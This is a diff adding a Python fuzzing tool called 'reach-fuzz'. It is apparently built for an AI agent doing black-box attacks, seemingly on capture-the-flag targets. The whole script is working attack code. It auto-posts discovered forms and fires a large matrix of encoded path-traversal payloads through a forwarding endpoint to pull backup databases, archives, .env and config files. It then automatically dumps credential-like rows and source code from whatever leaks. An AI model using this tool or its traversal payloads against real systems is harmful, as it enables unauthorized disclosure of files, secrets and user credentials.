@@ -1,0 +1,178 @@
+#!/usr/bin/env python3
+"""reach-fuzz — Reachable-Surface Exerciser (ares discovery tool).
+
+Mechanically EXERCISES primitives the agent has already discovered, against the RIGHT
+surface — the recurring black-box miss was "wrote down the vector, never executed it."
+Zero deps (stdlib urllib). Deterministic. Three modes:
+
+  reach-fuzz forms  --base URL [--cookie C]
+      Parse every <form> in GET base, auto-POST each (discovered field names + filler),
+      diff vs the GET. Surfaces leak channels that only appear on submit (e.g. a server
+      that proxies to an internal vhost and echoes Host/route names back on POST).
+
+  reach-fuzz pivot  --template 'http://host/api/x/{SEG}' [--cookie C]
+      Substitute a traversal+leak matrix into {SEG} (sibling dirs/buckets x backup/db/
+      source filenames x encodings) + bare-root + ?delimiter=/ listing. Fire THROUGH the
+      forward primitive. Flag SQLite/zip/source/autoindex hits. Auto-ingest a leaked
+      SQLite (dump cred-ish rows) or zip (list entries).
+
+It does NOT craft final exploits (PHAR/desync/payload-frontier) — by design. It surfaces
+the hidden endpoint/host/file + ingests the leak; the model drives the now-visible payload.
+"""
+import sys, re, argparse, urllib.request, urllib.parse, urllib.error, tempfile, subprocess, os, io, zipfile
+
+UA = "reach-fuzz/1.0"
+TIMEOUT = 8
+
+def fetch(url, method="GET", data=None, cookie=None, maxbytes=200000):
+    headers = {"User-Agent": UA}
+    if cookie: headers["Cookie"] = cookie
+    body = None
+    if data is not None:
+        body = urllib.parse.urlencode(data).encode()
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+    req = urllib.request.Request(url, data=body, headers=headers, method=method)
+    try:
+        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
+            raw = r.read(maxbytes)
+            return r.status, dict(r.headers), raw
+    except urllib.error.HTTPError as e:
+        try: raw = e.read(maxbytes)
+        except Exception: raw = b""
+        return e.code, dict(e.headers), raw
+    except Exception as e:
+        return None, {}, ("[reach-fuzz] request error: %s" % e).encode()
+
+LEAK_SIGS = [
+    (b"SQLite format 3", "SQLITE-DB"),
+    (b"PK\x03\x04", "ZIP"),
+    (b"Index of /", "AUTOINDEX"),
+    (b"<title>Index of", "AUTOINDEX"),
+    (b"-----BEGIN", "PEM/KEY"),
+    (b"<?php", "PHP-SOURCE"),
+    (b"DB_PASSWORD", "ENV/CONFIG"),
+]
+def classify(headers, raw):
+    hits = [tag for sig, tag in LEAK_SIGS if sig in raw[:512] or sig in raw]
+    if re.search(rb"[A-Za-z0-9_]{0,8}\{[0-9a-f]{16,}\}", raw): hits.append("FLAG-SHAPED")
+    if re.search(rb'href="[^"]+\.(db|sqlite|zip|sql|bak|tar|gz)"', raw, re.I): hits.append("DIR-HAS-LOOT")
+    return hits
+
+def show(url, status, headers, raw, note=""):
+    ct = headers.get("Content-Type", "?")
+    hits = classify(headers, raw)
+    tag = ("  <== " + ",".join(hits)) if hits else ""
+    print("  [%s] len=%-7s %-22s %s%s%s" % (status, len(raw), ct[:22], url[-70:], (" "+note) if note else "", tag))
+    return hits
+
+def ingest_sqlite(raw):
+    f = tempfile.NamedTemporaryFile(suffix=".db", delete=False); f.write(raw); f.close()
+    try:
+        tbls = subprocess.run(["sqlite3", f.name, ".tables"], capture_output=True, text=True, timeout=10).stdout.split()
+        print("    SQLite tables:", " ".join(tbls))
+        for t in tbls[:8]:
+            rows = subprocess.run(["sqlite3", f.name, "-header", "SELECT * FROM %s LIMIT 20;" % t], capture_output=True, text=True, timeout=10).stdout
+            if re.search(r"pass|user|token|secret|master|admin|flag|key", rows, re.I):
+                print("    [%s] (cred-ish rows):" % t); print("\n".join("      "+l for l in rows.splitlines()[:25]))
+    except FileNotFoundError:
+        print("    (sqlite3 not installed; raw SQLite saved at %s — open with python sqlite3)" % f.name)
+    except Exception as e:
+        print("    sqlite ingest error:", e)
+
+def ingest_zip(raw):
+    try:
+        z = zipfile.ZipFile(io.BytesIO(raw)); names = z.namelist()
+        print("    ZIP entries (%d):" % len(names), ", ".join(names[:30]))
+        for n in names:
+            if re.search(r"\.(php|py|js|rb|go|env|cfg|conf|sql)$", n, re.I):
+                try:
+                    src = z.read(n)[:1500].decode("utf-8", "replace")
+                    if re.search(r"route|@app|def |function |password|flag|read|include|unserialize|eval", src, re.I):
+                        print("    --- %s (head) ---" % n); print("\n".join("      "+l for l in src.splitlines()[:18]))
+                except Exception: pass
+    except Exception as e:
+        print("    zip ingest error:", e)
+
+def mode_forms(base, cookie):
+    print("[reach-fuzz forms] %s" % base)
+    st, hd, raw = fetch(base, cookie=cookie); html = raw.decode("utf-8", "replace")
+    forms = re.findall(r"<form\b[^>]*>(.*?)</form>", html, re.I | re.S)
+    attrs = re.findall(r"<form\b([^>]*)>", html, re.I)
+    if not forms: print("  (no <form> found)"); return
+    for i, (a, inner) in enumerate(zip(attrs, forms)):
+        am = dict(re.findall(r'(\w+)\s*=\s*"([^"]*)"', a))
+        action = urllib.parse.urljoin(base, am.get("action", base))
+        method = (am.get("method", "POST") or "POST").upper()
+        names = re.findall(r'name\s*=\s*"([^"]+)"', inner)
+        data = {n: ("test%d" % j if not re.search(r"mail", n, re.I) else "a@a.com") for j, n in enumerate(names)}
+        # include common submit markers many handlers gate on
+        data.setdefault("submit", "1")
+        gstat, ghd, graw = fetch(action, cookie=cookie)
+        pstat, phd, praw = fetch(action, method=("POST" if method != "GET" else "GET"), data=data, cookie=cookie)
+        diff = "(diff vs GET: len %d->%d)" % (len(graw), len(praw))
+        print(" form#%d -> %s %s fields=%s" % (i, method, action, names))
+        show(action, pstat, phd, praw, note=diff)
+        # surface NEW host/route/proxy tokens that appeared only on POST
+        newtok = set(re.findall(rb"[a-z0-9.-]+\.(?:router|internal|local|svc)\b|/devices/\w+|Via:|X-[A-Za-z-]*Proxy", praw)) - set(re.findall(rb"[a-z0-9.-]+\.(?:router|internal|local|svc)\b|/devices/\w+|Via:|X-[A-Za-z-]*Proxy", graw))
+        if newtok: print("    NEW-ON-POST tokens:", ", ".join(t.decode("latin1") for t in list(newtok)[:10]))
+
+SIBLINGS = ["backups", "backup", "db", "data", "private", "internal", "gold", "secret", "admin", "files", "uploads"]
+FILES = ["manapool.db", "database.db", "db.sqlite", "data.db", "dump.sql", "backup.zip", "source.zip", "app.zip", "www.zip", ".env", "config.php", "flag"]
+# Traversal-segment encodings (the "../" part) and SEPARATOR encodings (the "/" between
+# every path component). CRUCIAL: encode the INNER slashes too — many proxies normalize a
+# literal "/" before forwarding, so e.g. Next.js needs ..%2fbackups%2fmanapool.db (every
+# slash encoded), not ..%2fbackups/manapool.db. Cross both axes.
+DOTS = ["../", "..%2f", "%2e%2e%2f", "..%252f", "....//", "%2e%2e/", "..%c0%af"]
+SEPS = ["/", "%2f", "%252f"]
+
+def _paths(comps):
+    # comps = list of path components (e.g. ["backups","manapool.db"]); yield encoded variants
+    out = set()
+    for dot in DOTS:
+        for sep in SEPS:
+            for depth in (1, 2, 3):
+                out.add(dot * depth + sep.join(comps))
+            out.add("assets" + sep + dot + sep.join(comps))   # break out of a known prefix dir
+    out.add("/" + "/".join(comps))                            # absolute
+    return out
+
+def mode_pivot(template, cookie):
+    print("[reach-fuzz pivot] template=%s" % template)
+    seen, hitcount, total = {}, 0, 0
+    def probe(seg, label=""):
+        nonlocal hitcount, total
+        total += 1
+        url = template.replace("{SEG}", seg)
+        st, hd, raw = fetch(url, cookie=cookie)
+        hits = classify(hd, raw)
+        key = (st, len(raw))
+        # print ONLY interesting results (any leak signature) + a few sampled dupes; collapse 404 noise
+        if hits or (key not in seen):
+            if hits: hitcount += 1
+            seen[key] = seen.get(key, 0) + 1
+            if hits or seen[key] <= 1:
+                show(url, st, hd, raw, note=label)
+        if "SQLITE-DB" in hits: ingest_sqlite(raw)
+        if "ZIP" in hits: ingest_zip(raw)
+    for seg in ["", ".", "/", "?delimiter=/", "../"]:
+        probe(seg, "root/list")
+    for sib in SIBLINGS:
+        for fn in FILES:
+            for seg in _paths([sib, fn]):
+                probe(seg)
+    for fn in FILES:
+        for seg in _paths([fn]):
+            probe(seg)
+    print("  [reach-fuzz] %d probes, %d leak-hits (404/empty noise collapsed)" % (total, hitcount))
+
+def main():
+    ap = argparse.ArgumentParser(prog="reach-fuzz")
+    sub = ap.add_subparsers(dest="mode", required=True)
+    f = sub.add_parser("forms"); f.add_argument("--base", required=True); f.add_argument("--cookie")
+    p = sub.add_parser("pivot"); p.add_argument("--template", required=True, help="URL with {SEG} placeholder for the forwarded segment"); p.add_argument("--cookie")
+    a = ap.parse_args()
+    if a.mode == "forms": mode_forms(a.base, a.cookie)
+    elif a.mode == "pivot": mode_pivot(a.template, a.cookie)
+
+if __name__ == "__main__":
+    main()
